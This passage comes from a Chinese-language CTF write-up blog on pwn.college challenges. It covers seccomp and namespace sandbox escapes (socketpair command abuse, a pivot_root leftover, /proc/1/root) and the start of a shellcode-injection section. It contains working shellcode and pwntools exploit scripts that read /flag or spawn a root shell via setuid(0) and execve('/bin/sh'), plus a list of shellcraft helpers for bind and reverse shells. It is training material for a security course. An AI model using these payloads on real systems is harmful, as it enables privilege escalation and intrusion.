socketpair.\n&quot;</span>);<br>        close(<span class="hljs-number">0</span>);<br>        close(<span class="hljs-number">1</span>);<br>        close(<span class="hljs-number">2</span>);<br>        close(parent_socket);<br><br>        <span class="hljs-type">void</span> *shellcode = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        assert(shellcode == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x1337000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The child mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, shellcode);<br><br>        scmp_filter_ctx ctx;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Restricting system calls (default: kill).\n&quot;</span>);<br>        ctx = seccomp_init(SCMP_ACT_KILL);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allowing syscall: %s (number %i).\n&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, SCMP_SYS(read));<br>        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allowing syscall: %s (number %i).\n&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, SCMP_SYS(write));<br>        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allowing syscall: %s (number %i).\n&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, SCMP_SYS(<span class="hljs-built_in">exit</span>));<br>        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="hljs-built_in">exit</span>), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br><br>        assert(seccomp_load(ctx) == <span class="hljs-number">0</span>);<br><br>        read(child_socket, shellcode, <span class="hljs-number">0x1000</span>);<br><br>        write(child_socket, <span class="hljs-string">&quot;print_msg:Executing shellcode!&quot;</span>, <span class="hljs-number">128</span>);<br><br>        ((<span class="hljs-type">void</span>(*)())shellcode)();<br>    &#125;<br><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The parent is reading 0x1000 bytes of shellcode from stdin.\n&quot;</span>);<br>        <span class="hljs-type">char</span> shellcode[<span class="hljs-number">0x1000</span>];<br>        read(<span class="hljs-number">0</span>, shellcode, <span class="hljs-number">0x1000</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The parent is sending the shellcode to the child.\n&quot;</span>);<br>        write(parent_socket, shellcode, <span class="hljs-number">0x1000</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>        &#123;<br>            <span class="hljs-type">char</span> command[<span class="hljs-number">128</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The parent is waiting for a command from the child.\n&quot;</span>);<br>            <span class="hljs-type">int</span> command_size = read(parent_socket, command, <span class="hljs-number">128</span>);<br>            command[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>            <span class="hljs-type">char</span> *command_argument = &amp;command[<span class="hljs-number">10</span>];<br>            <span class="hljs-type">int</span> command_argument_size = command_size - <span class="hljs-number">10</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The parent received command `%.10s` with an argument of %d bytes from the child.\n&quot;</span>, command, command_argument_size);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;print_msg&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(command_argument);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;read_file&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                sendfile(parent_socket, open(command_argument, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: unknown command!\n&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里主要就是对于 <code>socketpair</code> 的理解。用于创建一对无名的、相互连接的套接字。如果函数成功，则返回0，创建好的套接字分别是sv[0]和sv[1]；否则返回-1，错误码保存于errno中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">socketpair</span><span class="hljs-params">(<span class="hljs-type">int</span> d, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol, <span class="hljs-type">int</span> sv[<span class="hljs-number">2</span>])</span>；<br></code></pre></td></tr></table></figure><ul><li>这对套接字可以用于全双工通信，每一个套接字既可以读也可以写。例如，可以往sv[0]中写，从sv[1]中读；或者从sv[1]中写，从sv[0]中读；</li><li>如果往一个套接字(如sv[0])中写入后，再从该套接字读时会阻塞，只能在另一个套接字中(sv[1])上读成功；</li></ul><p>​上文使用了下面的语句创建了两个套接字，它们也是一种文件描述符，那么这里parent_socker为3，child_socker为4。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> file_descriptors[<span class="hljs-number">2</span>];<br>assert(socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, file_descriptors) == <span class="hljs-number">0</span>);<br><br><span class="hljs-type">int</span> parent_socket = file_descriptors[<span class="hljs-number">0</span>];<span class="hljs-comment">//parent 3</span><br><span class="hljs-type">int</span> child_socket = file_descriptors[<span class="hljs-number">1</span>];<span class="hljs-comment">//child 4</span><br></code></pre></td></tr></table></figure><p>​之后就是看父子进程之间的交互了。这里就是首先父进程从标准输入读取我们写的shellcode，然后通过套接字传递给子进程，子进程向父进程发送信息之后执行我们的shellcode。之后父进程在while中读取子进程发送的信息，先打印读取的信息，再截取前9个字节与自己内置的字符串进行比较，如果为 <code>print_msg</code>，就直接输出传递第11个字节后的信息，如果为 <code>read_file</code>，则使用 <code>sendfile</code> 打开子进程发送信息第11个字节开始的数据(这里应该填写一个文件路径)，然后从头开始读128个字节到父端上面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!child_pid)&#123;<span class="hljs-comment">//child</span><br>    read(child_socket, shellcode, <span class="hljs-number">0x1000</span>);<span class="hljs-comment">//从子端读数据到shellcode</span><br>    write(child_socket, <span class="hljs-string">&quot;print_msg:Executing shellcode!&quot;</span>, <span class="hljs-number">128</span>);<span class="hljs-comment">//在子端写数据</span><br>    ((<span class="hljs-type">void</span>(*)())shellcode)();<span class="hljs-comment">//执行读出的数据</span><br>&#125;   <br><span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//parent</span><br>    <span class="hljs-type">char</span> shellcode[<span class="hljs-number">0x1000</span>];<br>    read(<span class="hljs-number">0</span>, shellcode, <span class="hljs-number">0x1000</span>);<span class="hljs-comment">//标准输入读，也就是我们的shellcode输入</span><br>    write(parent_socket, shellcode, <span class="hljs-number">0x1000</span>);<span class="hljs-comment">//shellcode写入父端</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> command[<span class="hljs-number">128</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-type">int</span> command_size = read(parent_socket, command, <span class="hljs-number">128</span>);<span class="hljs-comment">//父端读数据</span><br>        command[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-type">char</span> *command_argument = &amp;command[<span class="hljs-number">10</span>];<br>        <span class="hljs-type">int</span> command_argument_size = command_size - <span class="hljs-number">10</span>;<br>        <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The parent received command `%.10s` with an argument of %d bytes from the child.\n&quot;</span>, command, command_argument_size);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;print_msg&quot;</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(command_argument);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;read_file&quot;</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            sendfile(parent_socket, open(command_argument, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: unknown command!\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​然后就可以来写汇编了，这里我们结合汇编来分析，汇编总共就三条系统调用。</p><ul><li><code>write(4, &quot;read_file:/flag&quot;, 0x50)</code>，这里第一轮就是父进程读取shellcode发送给子进程，子进程回个 <code>print_msg</code>，然后父进程输出出来。然后子进程会调用shellcode，这里首先就是向文件描述符4，就是 <code>child_socket</code>，写入了 <code>read_file:/flag</code>，这里就是模拟第一轮的操作，写完之后因为父进程在while循环中不断准备read parent_socket的内容，所以就接收到了字符串 <code>read_file:/flag</code> ，然后解析发现会调用 <code>sendfile</code> 写信息(这里就是打开flag文件了)到 parent_socket。</li><li><code>read(4, addr of 0x1337800, 0x50)</code>，有了上面父进程写入flag到 parent_socker，所以按照socket的通信，需要再从子端读出来，这个read的设计就是如此，然后就把flag的内容读取到了地址 <code>0x1337800</code> 的位置了</li><li><code>write(4, addr of 0x1337800 + number, 0x50)</code>，读取完之后，这个时候父端和子端都是空闲的了，所以再使用 write 模拟子进程将指定地址的数据写入数据到子端，之后处于while循环的父进程会读取数据，因为这个时候读取的就是flag的内容了，所以前9个字节与内置的字符串都不同，因此这里使用的是上面的<code>printf</code>打印，将传输信息的前9个字节打印出来，所以这里就将flag的9个字节打印出来了，之后再调整写入的地址位置(number)，就可以获得完整的flag了</li></ul><h3 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9][0-9]&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi, 4</span><br><span class="hljs-string">    lea rsi, [rip+str1]</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    mov rax, 0x1</span><br><span class="hljs-string">    syscall                 # write(4, &quot;read_file:/flag&quot;, 0x50)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 4</span><br><span class="hljs-string">    mov rsi, 0x1337800</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall                 # read(4, addr of 0x1337800, 0x50)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 4</span><br><span class="hljs-string">    mov rsi, 0x1337800 + number</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    mov rax, 0x1</span><br><span class="hljs-string">    syscall                 # write(4, addr of 0x1337800 + number, 0x50)</span><br><span class="hljs-string">str1:</span><br><span class="hljs-string">    .string &quot;read_file:/flag&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">63</span>, <span class="hljs-number">9</span>):<br>    new_shellcode = shellcode.replace(<span class="hljs-string">&quot;number&quot;</span>, <span class="hljs-built_in">str</span>(i))<br>    payload = asm(new_shellcode, arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>    r = process(binary_paths)<br>    r.sendlineafter(<span class="hljs-string">b&quot;stdin&quot;</span>,payload)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        r.recvuntil(<span class="hljs-string">b&quot;The parent received command `&quot;</span>)<br>    flag += <span class="hljs-built_in">bytes</span>(r.recv(<span class="hljs-number">9</span>))<br>    r.close()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="level-14"><a class="markdownIt-Anchor" href="#level-14"></a> level 14</h2><p>​看<a href="https://www.youtube.com/watch?v=ty_IJiaWh-0">视频</a>，还有个9.15的。9.15是介绍namespace的，然后这个9.20是介绍escape namespace的。记住首先使用 <code>vm connect</code> 再开启程序(程序里面有提示)，不然禁止运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;... creating a directory in which pivot_root will put the old root filesystem.&quot;</span>);<br><span class="hljs-built_in">snprintf</span>(old_root, <span class="hljs-keyword">sizeof</span>(old_root), <span class="hljs-string">&quot;%s/old&quot;</span>, new_root);<br>assert(mkdir(old_root, <span class="hljs-number">0777</span>) != <span class="hljs-number">-1</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;... pivoting the root filesystem!&quot;</span>);<br>assert(syscall(SYS_pivot_root, new_root, old_root) != <span class="hljs-number">-1</span>);<br></code></pre></td></tr></table></figure><p>​主要是这里，它放置了旧的文件目录，但是没有去删除它，所以直接访问这个 <code>old</code> 路径就可以看见原本的根目录环境，直接 <code>cat flag</code> 即可。</p><h2 id="level-15-16"><a class="markdownIt-Anchor" href="#level-15-16"></a> level 15-16</h2><p>​这里如果没有挂载 <code>proc</code> 目录，则使用 <code>mkdir proc &amp;&amp; mount -t proc proc /proc</code> 进行挂载，然后使用 <code>cat /proc/1/root/flag</code> 就可以获得flag</p><h1 id="race-conditions"><a class="markdownIt-Anchor" href="#race-conditions"></a> Race Conditions</h1><h1 id="kernel-security"><a class="markdownIt-Anchor" href="#kernel-security"></a> Kernel Security</h1><h1 id="system-exploitation"><a class="markdownIt-Anchor" href="#system-exploitation"></a> System Exploitation</h1><h1 id="others"><a class="markdownIt-Anchor" href="#others"></a> Others</h1><blockquote><p><a href="https://i3r0nya.cn/wiki/writeup/pwn.college/sandboxing/">参考wp1</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn.college(2)</title>
    <link href="/posts/b0a958e2.html"/>
    <url>/posts/b0a958e2.html</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode-injection"><a class="markdownIt-Anchor" href="#shellcode-injection"></a> Shellcode Injection</h1><h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2><h3 id="gcc汇编"><a class="markdownIt-Anchor" href="#gcc汇编"></a> gcc汇编</h3><p>Our way of building shellcode translates well to other architectures:</p><ul><li>amd64:<code>gcc -nostdlib -static shellcode.s -o shellcode-elf</code></li><li>mips:<code>mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf</code></li></ul><p>参数说明：</p><ul><li><code>-nostdlib</code>：不使用标准库，使用标准库则必须有main函数</li><li><code>-static</code>：静态编译，这样就不会引用共享库了</li><li><code>-static-pie</code>：位置无关编译。</li></ul><p>Similarly, we can run cross-architecture shellcode with an emulator:</p><ul><li>amd64:<code>./shellcode</code></li><li>mips:<code>qemu-mips-static ./shellcode-mips</code></li></ul><h3 id="pwntools模块"><a class="markdownIt-Anchor" href="#pwntools模块"></a> pwntools模块</h3><p>​pwntools可以通过<code>shellcraft</code>模块来自动生成shellcode。对于不同架构的shellcode，可以通过添加 <code>context(arch = 'amd64' , os = 'linux', log_level=&quot;debug&quot;)</code> 来进行区分生成。</p><p>​常规操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#生成不带参数调用sh的代码：</span><br>shellcraft.sh()<br><br><span class="hljs-comment">#可以直接使用execve来调用带参数的sh：</span><br>shellcraft.execve(<span class="hljs-string">&#x27;sh&#x27;</span>,[<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-p&#x27;</span>])<br><br><span class="hljs-comment">#生成插入指定字符串到栈中的代码：</span><br>shellcraft.pushstr(string, append_null=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#生成插入字符串序列到栈中的代码：</span><br><span class="hljs-comment">#可以和上面的sh()代码结合起来调用-p参数的sh</span><br>shellcraft.pushstr_array(reg, array)<br><br><span class="hljs-comment">#读取文件并回显，调用结构为：open()-&gt;sendfileto()</span><br>shellcraft.cat(filename, fd=<span class="hljs-number">1</span>)<br>shellcraft.cat2(filename, fd=<span class="hljs-number">1</span>, length=<span class="hljs-number">16384</span>)<br><br><span class="hljs-comment">#打开文件，得到的文件描述符在rax，文件打开标志oflag见下面，mode是文件权限默认为0：</span><br>shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, oflag=<span class="hljs-number">0</span>, mode=<span class="hljs-number">0</span>)<br><span class="hljs-comment">#读数据，fd可设为如rax这样的寄存器名，默认是将数据读取到栈中，默认读1字节：</span><br>shellcraft.read(fd=<span class="hljs-number">0</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br><span class="hljs-comment">#写数据</span><br>shellcraft.write(fd=<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br><br><span class="hljs-comment">#读取指定路径的文件：</span><br>shellcraft.readfile(path, dst=<span class="hljs-string">&#x27;rdi&#x27;</span>)<br><br><span class="hljs-comment">#网络相关：</span><br><span class="hljs-comment">#当没有回显时，一般可以用网络操作得到程序交互</span><br><br><span class="hljs-comment">#将sh绑定到端口，作为tcp服务(network=&#x27;ipv4&#x27; or &#x27;ipv6&#x27;)：</span><br>shellcraft.bindsh(port, network)<br><br><span class="hljs-comment">#连接指定远程地址，连接得到的文件描述符放在rbp寄存器中：</span><br>shellcraft.connect(host, port, network=<span class="hljs-string">&#x27;ipv4&#x27;</span>)<br><br><span class="hljs-comment">#将输入输出全部绑定到指定文件描述符，一般用来将shell反弹到远程地址，dupsh可以在绑定之后自动启动sh：</span><br>shellcraft.dup(sock=<span class="hljs-string">&#x27;rbp&#x27;</span>)<br>shellcraft.dupsh(sock=<span class="hljs-string">&#x27;rbp&#x27;</span>)<br><br><span class="hljs-comment">#将字符串写入文件描述符指定文件：</span><br>shellcraft.echo(string, sock=<span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="depnx"><a class="markdownIt-Anchor" href="#depnx"></a> DEP/NX</h3><p>​数据执行防护(DEP) 或 No-Execute(NX)。 启用此选项后，它将与处理器配合工作，通过阻止从标记为不可执行的内存执行代码来帮助防止缓冲区溢出攻击。可以禁止将栈中的数据作为代码执行。</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</li></ul><h3 id="other"><a class="markdownIt-Anchor" href="#other"></a> other</h3><ul><li><p><a href="https://yuankun.me/syscall32/">Linux System Call Table for x86</a></p></li><li><p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64 · Ryan A. Chapman (rchapman.org)</a></p></li></ul><h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2><blockquote><p>多种方式获取flag，可以getshell，或者直接执行命令，或者pwntools</p></blockquote><ul><li><p>使用 gcc 编译可以直接使用下面的shell脚本</p></li><li><pre class="highlight"><code class="shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>gcc $1 -nostdlib -o d.out &amp;&amp; objcopy --dump-section .text=solve.bin d.outrm d.out<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### wp1</span><br><br>- 调用的是sendfile(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, NULl), <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)，第三个参数表示从文件什么地方读，这里<span class="hljs-string">&quot;0&quot;</span>表示从开头读取<br><br>- 这里 `rdi rsi rdx r10` 依次是函数的参数指代的寄存器，其中 rdi 中存储的地址指向需要的字符串<br>- syscall `open rax=<span class="hljs-number">2</span>, sendfile rax=<span class="hljs-number">40</span>, <span class="hljs-keyword">exit</span> rax=<span class="hljs-number">60</span>, execve rax=<span class="hljs-number">59</span>`<br><br>```python<br>from pwn import *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br><br>r = process([<span class="hljs-string">&quot;/challenge/babyshell_level1&quot;</span>])<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  mov rbx,0x00000067616c662f</span><br><span class="hljs-string">  push rbx</span><br><span class="hljs-string">  mov rdi,rsp# 先将&quot;/flag\0&quot;压栈，然后用rdi指代，这里rdi若指代字符串必须是赋值一个地址，这个地址指向那个字符串</span><br><span class="hljs-string">  mov rsi,0</span><br><span class="hljs-string">  mov rax,2</span><br><span class="hljs-string">  syscall# open(&quot;/flag&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">  mov rdi,1</span><br><span class="hljs-string">  mov rsi,rax</span><br><span class="hljs-string">  mov rdx,0</span><br><span class="hljs-string">  mov r10,1000</span><br><span class="hljs-string">  mov rax,40</span><br><span class="hljs-string">  syscall# sendfile</span><br><span class="hljs-string"></span><br><span class="hljs-string">  mov rax,60</span><br><span class="hljs-string">  syscall#exit(rdi)-&gt;返回rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>r.send(payload)<br><span class="hljs-comment"># r.interactive()</span><br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>​这里存一手d.s获取flag的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assemble">.global _start<br>.intel_syntax noprefix<br>_start:<br>    mov rbx,0x00000067616c662f# open <br>    push rbx<br>    mov rdi,rsp<br>    mov rsi,0<br>    mov rax,2<br>    syscall<br>    <br>    mov rdi,1# sendline<br>    mov rsi,rax<br>    mov rdx,0<br>    mov r10,1000<br>    mov rax,40<br>    syscall<br>    <br>    mov rax,60# exit<br>    syscall<br></code></pre></td></tr></table></figure><h3 id="wp2"><a class="markdownIt-Anchor" href="#wp2"></a> wp2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># d.s<br>.global _start<br>.intel_syntax noprefix<br>_start:<br>        mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权<br>        mov rdi, 0<br>        syscall<br><br>        mov rax, 59             # execve<br>        lea rdi, [rip+binsh]<br>        mov rsi, 0<br>        mov rdx, 0<br>        syscall<br>binsh:<br>        .string &quot;/bin/sh&quot;<br></code></pre></td></tr></table></figure><h2 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h2><blockquote><p>过滤了前面0x800的字节，使用.rept来重复填充，然后使用level1的代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rept 0x800<br>nop<br>.endr<br></code></pre></td></tr></table></figure><p>或者 <code>payload = asm(shellcode, arch=’amd64’).rjust(0x900, b’\x90’)</code></p><h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 